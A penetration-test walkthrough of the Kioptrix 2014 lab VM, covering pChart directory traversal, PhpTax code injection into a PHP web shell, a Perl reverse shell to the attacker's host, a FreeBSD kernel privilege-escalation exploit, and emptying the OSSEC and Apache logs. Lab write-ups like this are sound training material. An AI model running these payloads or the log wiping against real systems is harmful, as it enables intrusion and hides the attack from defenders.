**Vulnerable System**: Kioptrix 2014 (Level 5)
==============================================

**Operating System**: FreeBSD 9.0

*Low Privilege*

**Vulnerability Exploited**: pChart 2.1.3 Directory Traversal Vulnerability

**Exploit Used**: pChart 2.1.3 - Multiple Vulnerabilities

**Proof of Concept Code**: <https://www.exploit-db.com/exploits/31173>

**Vulnerability Explained**: Local File Inclusion vulnerability leads to
sensitive information disclosure, in this case /etc/passwd file and httpd.conf.

**Vulnerability fix**: Update to the latest version of the software. Remove
public access to the examples folder where applicable. Use a Web Application
Firewall or similar technology to filter malicious input attempts.

**Severity**: **Low**

**Vulnerability Exploited**: PhpTax 'newvalue' Parameter PHP Code Injection
Vulnerability

**Exploit Used:** PhpTax 0.8 - File Manipulation 'newvalue' / Remote Code
Execution

**Proof of Concept**: <https://www.exploit-db.com/exploits/25849>

**Vulnerability Explained:** An attacker might write to arbitrary files or
inject arbitrary code into a file with this vulnerability. In this case PHP code
is written that lets attacker executed commands remote, resulting in a reverse
shell execution.

**Vulnerability Fix:** Restrict application permissions, restrict folder
permissions. Use a Web Application Firewall or similar technology to filter
malicious input attempts.

**Severity**: **Medium**

--------------------------------------------------------------------------------------------------------------------------------------

**Privilege Escalation Vulnerability**: FreeBSD CVE-2013-2171 Local Privilege
Escalation Vulnerability

**Exploit Used**: FreeBSD 9.0 \< 9.1 - 'mmap/ptrace' Local Privilege Escalation

**Proof of Concept Code**: <https://www.exploit-db.com/exploits/26368>

**Privilege Escalation Vulnerability Explained:** This exploit overwrite
portions of the kernel resulting in privilege escalation.

**Vulnerability fix**: Update the system to the newest version possible. Fixes
available from the vendor, refer to
[FreeBSD Advisory](https://www.freebsd.org/security/advisories/FreeBSD-SA-13:06.mmap.asc)

**Severity**: **High**

Methodology
-----------

-   Host Discovery (netdiscover)

-   Port Scanning (nmap)

-   Web Ports Enumeration (nikto, gobuster, browser)

-   Discovered Local File Inclusion Vulnerability (searchsploit/exploit-db)

-   Discovered Port 8080 Restriction Workaround (Local File Inclusion,
    httpd.conf)

-   Further Web Port Enumeration (browser)

-   Discovered Remote Command Execution Vulnerability (searchsploit/exploit-db)

-   Low Privilege Shell Gained (pearl reverse shell/nc)

-   Privilege Escalation Enumeration (uname -a)

-   Discovered Appropriate Exploit (searchsploit)

-   Compiled the Exploit and Gained Administrative Privileges

-   Purged Logs

Reconnaissance 
---------------

### Netdiscover

Discovering the vulnerable system.

```bash
root@kali:~/vulnhub/kioptrix_5# netdiscover -r 192.168.20.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                          
                                                                                                                        
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                        
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.20.1    00:50:56:c0:00:01      1      60  VMware, Inc.                                                         
 192.168.20.148  00:0c:29:b4:3d:77      1      60  VMware, Inc.                                                         
 192.168.20.254  00:50:56:e2:32:bb      1      60  VMware, Inc.
```
### Nmap

Nmap all ports scan:
```bash
root@kali:~/vulnhub/kioptrix_5# nmap -p- 192.168.20.148
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-05 13:00 EDT
Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 192.168.20.148
Host is up (0.00024s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE
22/tcp   closed ssh
80/tcp   open   http
8080/tcp open   http-proxy
MAC Address: 00:0C:29:B4:3D:77 (VMware)
```
Nmap version and default script scan:
```bash
root@kali:~/vulnhub/kioptrix_5# nmap -sV -sC -A -p 22,80,8080 192.168.20.148
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-05 13:03 EDT
Nmap scan report for 192.168.20.148
Host is up (0.00045s latency).

PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: Site doesn't have a title (text/html).
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
MAC Address: 00:0C:29:B4:3D:77 (VMware)
Device type: general purpose
Running: FreeBSD 9.X|10.X
OS CPE: cpe:/o:freebsd:freebsd:9 cpe:/o:freebsd:freebsd:10
OS details: FreeBSD 9.0-RELEASE - 10.3-RELEASE
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms 192.168.20.148
```

### Web Port Enumeration (Port 80)

#### Nikto
```bash
root@kali:~/vulnhub/kioptrix_5# nikto -h 192.168.20.148
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.20.148
+ Target Hostname:    192.168.20.148
+ Target Port:        80
+ Start Time:         2019-09-05 13:40:52 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
+ Server may leak inodes via ETags, header found with file /, inode: 67014, size: 152, mtime: Sat Mar 29 13:22:52 2014
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. 
This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ PHP/5.3.8 appears to be outdated (current is at least 7.2.12). 
PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. 
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ 8724 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2019-09-05 13:42:18 (GMT-4) (86 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

#### GoBuster

Discovering hidden directories (if any)

```bash
root@kali:~# gobuster dir -t 2 -u 192.168.20.148 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.20.148
[+] Threads:        2
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/05 13:45:51 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/index.html (Status: 200)
===============================================================
2019/09/05 13:46:16 Finished
===============================================================
```

#### Browser

Enumerating port 80 via browser.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%205/Images/browser80.png?raw=true)

Looking at webpages source code thereâ€™s a reference to another directory called
pChart2.1.3:
```
<html>
 <head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
 </head>

 <body>
  <h1>It works!</h1>
 </body>
</html>
```

Following the directory mentioned in the image above, presents us with what
looks like charting software.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%205/Images/browser80_2.png?raw=true)

### Web Port Enumeration (Port 8080)

#### Nikto

Web Application vulnerability scanning of port 8080.
```bash
root@kali:~/vulnhub/kioptrix_5# nikto -h 192.168.20.148:8080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.20.148
+ Target Hostname:    192.168.20.148
+ Target Port:        8080
+ Start Time:         2019-09-05 13:42:58 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. 
This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ All CGI directories 'found', use '-C none' to test none
+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.3.8 appears to be outdated (current is at least 7.2.12). 
PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. 
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ 26549 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2019-09-05 13:47:47 (GMT-4) (289 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
#### Dirb

Discovering hidden directories (if any)

```bash
root@kali:~# dirb http://192.168.20.148:8080

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Sep  5 13:49:36 2019
URL_BASE: http://192.168.20.148:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.20.148:8080/ ----
+ http://192.168.20.148:8080/cgi-bin/ (CODE:403|SIZE:210)                                                                                        
                                                                                                                                                 
-----------------
END_TIME: Thu Sep  5 13:49:59 2019
DOWNLOADED: 4612 - FOUND: 1
```

#### Browser

Enumerating port 8080 via browser.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%205/Images/browser8080.png?raw=true)

Low Privilege Exploitation
--------------------------

### Vulnerability Identification (Port 80)

Using searchsploit to find appropriate vulnerability in exploit-db database.

```bash
root@kali:~# searchsploit pchart
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
pChart 2.1.3 - Multiple Vulnerabilitie | exploits/php/webapps/31173.txt
--------------------------------------- ----------------------------------------
```

Identifying exploit’s patch and copying it to the clipboard.
```bash
root@kali:~# searchsploit -p 31173
  Exploit: pChart 2.1.3 - Multiple Vulnerabilities
      URL: https://www.exploit-db.com/exploits/31173
     Path: /usr/share/exploitdb/exploits/php/webapps/31173.txt
File Type: HTML document, ASCII text, with CRLF line terminators

Copied EDB-ID #31173's path to the clipboard.
```

The multiple vulnerabilities are Directory Traversal and Reflected XSS.

In this case Directory Traversal is what will be exploited.

### Local File Inclusion

As per exploit directory traversal is executed in the following fashion:

<http://192.168.20.148/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd>

The exploit yields the following:
```
# $FreeBSD: release/9.0.0/etc/master.passwd 218047 2011-01-28 22:29:38Z pjd $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin
ossec:*:1001:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecm:*:1002:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecr:*:1003:1001:User &:/usr/local/ossec-hids:/sbin/nologin
```

After further enumeration nothing else was found that would help us get a shell
from port 80.

Next an attempt to troubleshoot port 8080 is made. The reason for 403 error
needs to be found. For that access to web serverâ€™s configuration file is needed.

We know that the target runs BSD. After reading FreeBSDâ€™s apache [manual](
https://www.freebsd.org/doc/en/books/handbook/network-apache.html), the
following LFI URL is crafted:

<http://192.168.20.148/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf>

From httpd.conf the following information obtained about port 8080:
```
<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2

<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory>
```

It seems like only Mozilla4 browser is allowed to browse the website on that
port.

### Further Web Port Enumeration (Port 8080)

Burpsuite can be used to change the User-Agent to Mozilla/4.0 (Proxy -> Options) for every http
request as per screenshot below.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%205/Images/burp1.png?raw=true)

Once the setting is on the intercept mode can be turned off.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%205/Images/burp2.png?raw=true)

The webpage now becomes available.

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%205/Images/browser8080_2.png?raw=true)

It seems thereâ€™s software called phptax running on the server.

### Vulnerability Identification (Port 8080)

Using searchsploit to find appropriate vulnerability in exploit-db database.
```bash
root@kali:~/vulnhub/kioptrix_5# searchsploit phptax
-------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                      |  Path
                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------- ----------------------------------------
PhpTax - 'pfilez' Execution Remote Code Injection (Metasploit)      | exploits/php/webapps/21833.rb
PhpTax 0.8 - File Manipulation 'newvalue' / Remote Code Execution   | exploits/php/webapps/25849.txt
phptax 0.8 - Remote Code Execution                                  | exploits/php/webapps/21665.txt
-------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```

Identifying exploit’s patch and copying it to the clipboard.
```bash
root@kali:~# searchsploit -p 25849
  Exploit: PhpTax 0.8 - File Manipulation 'newvalue' / Remote Code Execution
      URL: https://www.exploit-db.com/exploits/25849
     Path: /usr/share/exploitdb/exploits/php/webapps/25849.txt
File Type: ASCII text, with CRLF line terminators

Copied EDB-ID #25849's path to the clipboard.
```

### Remote Command Execution

Although the exploit itself didn't work, going through exploit's code the following URL exploit has been manually crafted:

```
http://192.168.20.148:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E%22
```

To test the exploit **id** command has been ran through the URL as shown below:

```
http://192.168.20.148:8080/phptax/data/rce.php?cmd=id
```

![](https://github.com/lifesfun101/Offensive-Security/blob/master/Walkthroughs/Kioptrix%20Level%205/Images/id.png?raw=true)

### Low Privilege Shell

Exploiting remote command execution using [perl reverse
shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```
http://192.168.20.148:8080/phptax/data/rce.php?cmd=perl+-e+%27use+Socket%3B%24i%3D%22192.168.20.144%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh+-i%22%29%3B%7D%3B%27
```

Catching reverse shell and upgrading the shell to TTY shell:

```bash
root@kali:~# nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.20.144] from (UNKNOWN) [192.168.20.148] 48185
sh: can't access tty; job control turned off
$ whoami
www
$ perl -e 'exec "/bin/bash";'
```

Privilege Escalation
--------------------

### Enumeration

Confirming the target’s operating system/kernel:
```bash
$ uname -a
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
```

### Vulnerability Identification
Using searchsploit to find appropriate vulnerability in exploit-db database.

```bash
root@kali:~/vulnhub/kioptrix_5# searchsploit freebsd 9.0
-------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                      |  Path
                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------- ----------------------------------------
FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation              | exploits/freebsd/local/28718.c
FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation        | exploits/freebsd/local/26368.c
-------------------------------------------------------------------- ----------------------------------------
```

Identifying exploit’s patch and copying it to the clipboard and working directory.

```bash
root@kali:~/vulnhub/kioptrix_5# searchsploit -p 26368
  Exploit: FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/26368
     Path: /usr/share/exploitdb/exploits/freebsd/local/26368.c
File Type: C source, ASCII text, with CRLF line terminators

Copied EDB-ID #26368's path to the clipboard.
root@kali:~/vulnhub/kioptrix_5# cp /usr/share/exploitdb/exploits/freebsd/local/26368.c .
```

### Exploitation

Next, starting Python Simple HTTP Server to serve the exploit.

```bash
root@kali:~/vulnhub/kioptrix_5# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.20.148 - - [05/Sep/2019 21:53:12] "GET /26368.c HTTP/1.1" 200 –
Using fetch command to download the exploit. (Unlike most Linux system, FreeBSD uses fetch not wget)
$ fetch http://192.168.20.144:8000/26368.c
26368.c                                               2213  B   14 MBps
```

Using **fetch** command to download the exploit. (Unlike most Linux system,
FreeBSD uses fetch not wget)

```bash
$ fetch http://192.168.20.144:8000/26368.c
26368.c                                               2213  B   14 MBps
```

Running exploit and gaining administrative privileges:

```bash
$ gcc 26368.c -o exp
26368.c:89:2: warning: no newline at end of file
$ ./exp
#whoami
root
# cd /root
# ls
.cshrc
.history
.k5login
.login
.mysql_history
.profile
congrats.txt
folderMonitor.log
httpd-access.log
lazyClearLog.sh
monitor.py
ossec-alerts.log
```

Flag file:

```bash
# cat congrats.txt
If you are reading this, it means you got root (or cheated).
Congratulations either way...

Hope you enjoyed this new VM of mine. As always, they are made for the beginner in 
mind, and not meant for the seasoned pentester. However this does not mean one 
can't enjoy them.

As with all my VMs, besides getting "root" on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering & research. Anyone can throw massive amounts of exploits
and "hope" it works, but think about the traffic.. the logs... Best to take it
slow, and read up on the information you gathered and hopefully craft better
more targetted attacks. 

For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
Knowing the OS gives you any idea of what will work and what won't from the get go.
Default file locations are not the same on FreeBSD versus a Linux based distribution.
Apache logs aren't in "/var/log/apache/access.log", but in "/var/log/httpd-access.log".
It's default document root is not "/var/www/" but in "/usr/local/www/apache22/data".
Finding and knowing these little details will greatly help during an attack. Of course
my examples are specific for this target, but the theory applies to all systems.

As a small exercise, look at the logs and see how much noise you generated. Of course
the log results may not be accurate if you created a snapshot and reverted, but at least
it will give you an idea. For fun, I installed "OSSEC-HIDS" and monitored a few things.
Default settings, nothing fancy but it should've logged a few of your attacks. Look
at the following files:
/root/folderMonitor.log
/root/httpd-access.log (softlink)
/root/ossec-alerts.log (softlink)

The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
files in 2 specific folders. Since FreeBSD doesn't support "iNotify", I couldn't use OSSEC-HIDS 
for this.
The httpd-access.log is rather self-explanatory .
Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
files. This one should've detected a few of your web attacks.

Feel free to explore the system and other log files to see how noisy, or silent, you were.
And again, thank you for taking the time to download and play.
Sincerely hope you enjoyed yourself.

Be good...


loneferret
http://www.kioptrix.com
```

Let’s check out the logs loneferret mentions:

folderMonitor.log:

```bash
# cat /root/folderMonitor.log
2019-09-05 12:52:33 - User [root] modified directory: /tmp
2019-09-05 13:39:05 - User [root] modified directory: /tmp
2019-09-05 13:39:07 - Deleted file: /tmp/mysql.sock
2019-09-05 13:39:07 - Deleted file: /tmp/aprLmK16j
2019-09-05 13:39:07 - User [root] modified directory: /tmp
2019-09-05 15:53:08 - User [www] created file: /usr/local/www/apache22/data2/phptax/data/rce.php
2019-09-05 15:53:08 - User [www] modified directory: /usr/local/www/apache22/data2/phptax/data
2019-09-05 17:55:51 - User [www] created file: /tmp/LinEnum.sh
2019-09-05 17:55:51 - User [root] modified directory: /tmp
2019-09-05 21:53:12 - User [www] created file: /tmp/26368.c
2019-09-05 21:53:12 - User [root] modified directory: /tmp
2019-09-05 21:54:28 - User [www] created file: /tmp/exp
2019-09-05 21:54:28 - User [root] modified directory: /tmp
```

A small snippet from httpd-access.log (there was a really long list of entries)

\# cat /root/httpd-access.log

192.168.20.144 - - [05/Sep/2019:13:03:41 -0400] "GET / HTTP/1.0" 403 202 "-" "-"

192.168.20.144 - - [05/Sep/2019:13:03:41 -0400] "GET / HTTP/1.0" 200 152 "-" "-"

192.168.20.144 - - [05/Sep/2019:13:03:47 -0400] "GET http://www.google.com
HTTP/1.0" 403 202 "-" "-"

192.168.20.144 - - [05/Sep/2019:13:03:47 -0400] "GET / HTTP/1.1" 200 152 "-"
"Mozilla/5.0 (compatible; Nmap Scripting Engine;
https://nmap.org/book/nse.html)"

192.168.20.144 - - [05/Sep/2019:13:03:47 -0400] "GET /nmaplowercheck1567703027
HTTP/1.1" 404 222 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine;
https://nmap.org/book/nse.html)"

192.168.20.144 - - [05/Sep/2019:13:03:48 -0400] "\\x16\\x03\\x01\\x02" 403 202
"-" "-"

192.168.20.144 - - [05/Sep/2019:13:03:48 -0400] "PROPFIND / HTTP/1.1" 403 202
"-" "Mozilla/5.0 (compatible; Nmap Scripting Engine;
https://nmap.org/book/nse.html)"

192.168.20.144 - - [05/Sep/2019:13:03:49 -0400] "OPTIONS / HTTP/1.1" 403 202 "-"
"Mozilla/5.0 (compatible; Nmap Scripting Engine;
https://nmap.org/book/nse.html)"

```bash
# cat /root/httpd-access.log

192.168.20.144 - - [05/Sep/2019:13:03:41 -0400] "GET / HTTP/1.0" 403 202 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:03:41 -0400] "GET / HTTP/1.0" 200 152 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:03:47 -0400] "GET http://www.google.com HTTP/1.0" 403 202 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:03:47 -0400] "GET / HTTP/1.1" 200 152 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.20.144 - - [05/Sep/2019:13:03:47 -0400] "GET /nmaplowercheck1567703027 HTTP/1.1" 404 222 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.20.144 - - [05/Sep/2019:13:03:48 -0400] "\x16\x03\x01\x02" 403 202 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:03:48 -0400] "PROPFIND / HTTP/1.1" 403 202 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.20.144 - - [05/Sep/2019:13:03:49 -0400] "OPTIONS / HTTP/1.1" 403 202 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.20.144 - - [05/Sep/2019:13:03:50 -0400] "\x16\x03\x01\x02" 403 202 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:03:55 -0400] "POST / HTTP/1.1" 403 202 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.20.144 - - [05/Sep/2019:13:03:56 -0400] "\x16\x03\x01\x02" 501 216 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:03:56 -0400] "\x16\x03\x01\x02" 501 216 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:03:57 -0400] "CONNECT www.google.com:80 HTTP/1.0" 403 202 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:03:59 -0400] "OPTIONS / HTTP/1.1" 200 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.20.144 - - [05/Sep/2019:13:04:00 -0400] "\x16\x03\x01\x02" 403 202 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:04:01 -0400] "OPTIONS / HTTP/1.1" 403 202 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
192.168.20.144 - - [05/Sep/2019:13:04:02 -0400] "\x16\x03\x01\x02" 501 216 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:04:02 -0400] "\x16\x03\x01\x02" 501 216 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:04:03 -0400] "GET / HTTP/1.0" 403 202 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:04:03 -0400] "GET / HTTP/1.1" 403 202 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:04:04 -0400] "\x16\x03\x01\x02" 501 216 "-" "-"
192.168.20.144 - - [05/Sep/2019:13:04:04 -0400] "\x16\x03\x01\x02" 501 216 "-" "-"
```

Small snippet from ossec-alerts.log (again there was a really long list of
entries)

```bash
# cat /root/ossec-alerts.log
** Alert 1567702476.0: mail  - ossec,
2019 Sep 05 12:54:36 kioptrix2014->ossec-monitord
Rule: 502 (level 3) -> 'Ossec server started.'
ossec: Ossec started.

** Alert 1567703022.158: - web,accesslog,
2019 Sep 05 13:03:42 kioptrix2014->/var/log/httpd-access.log
Rule: 31101 (level 5) -> 'Web server 400 error code.'
Src IP: 192.168.20.144
192.168.20.144 - - [05/Sep/2019:13:03:41 -0400] "GET / HTTP/1.0" 403 202 "-" "-"

** Alert 1567703022.420: - apache,access_denied,
2019 Sep 05 13:03:42 kioptrix2014->/var/log/httpd-error.log
Rule: 30105 (level 5) -> 'Attempt to access forbidden file or directory.'
Src IP: 192.168.20.144
[Thu Sep 05 13:03:41 2019] [error] [client 192.168.20.144] client denied by server configuration: /usr/local/www/apache22/data2/

** Alert 1567703028.756: - web,accesslog,
2019 Sep 05 13:03:48 kioptrix2014->/var/log/httpd-access.log
Rule: 31101 (level 5) -> 'Web server 400 error code.'
Src IP: 192.168.20.144
192.168.20.144 - - [05/Sep/2019:13:03:47 -0400] "GET http://www.google.com HTTP/1.0" 403 202 "-" "-"
```

### Log Purging

As it turns out quite a bit of noise was made. To purge these logs the following
commands were used:

```bash
# >/root/folderMonitor.log
# >/root/httpd-access.log
# >/root/ossec-alerts.log
```

After purging the logs, they can be checked with cat command to ensure they were purged.
```bash
# cat /root/folderMonitor.log
# cat /root/httpd-access.log
# cat /root/ossec-alerts.log
```
